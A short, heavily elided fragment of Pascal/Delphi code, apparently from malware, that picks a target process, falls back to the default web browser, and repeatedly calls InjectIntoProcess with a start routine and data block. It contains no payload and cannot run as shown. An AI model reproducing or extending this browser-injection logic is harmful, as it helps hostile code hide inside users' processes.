...
begin
  ...
  if Config.InjectProcess = NoInjection then Process := 0 else
  begin
    ...
    begin
      ...
      if Process = 0 then
      begin
        if ProcessExists(ProcName, Process) = False then ProcName := GetDefaultBrowser else
  ...
  begin
    CloseHandle(MasterMutex);
    repeat
      p := InjectIntoProcess(Process, @Start, @Dados);
      Sleep(500);
      if p = nil then
      begin
